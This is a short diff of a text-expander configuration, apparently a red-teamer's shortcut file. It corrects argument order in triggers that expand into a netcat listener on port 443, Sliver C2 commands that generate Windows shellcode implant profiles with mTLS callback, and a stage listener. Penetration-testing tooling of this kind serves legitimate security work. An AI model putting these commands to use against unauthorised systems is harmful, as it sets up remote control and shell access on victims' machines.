@@ -91,10 +91,10 @@ matches:
     replace: nc -nvlp 443
     
   - trigger: ":sliver64profile"
-    replace: profiles new --mtls {{IP}}:443 --format shellcode win-shellcode -o 
+    replace: profiles new --mtls {{IP}}:443 --format shellcode -o windows  win-shellcode
   
   - trigger: ":sliver32profile"
-    replace: profiles new -a 386 --mtls {{IP}}:443 --format shellcode win-shellcodex86 -o 
+    replace: profiles new -a 386 --mtls {{IP}}:443 --format shellcode -o windows win-shellcodex86
 
   - trigger: ":sliverstage"
     replace: stage-listener --url http://ip:8443 --prepend-size --profile win-shellcode
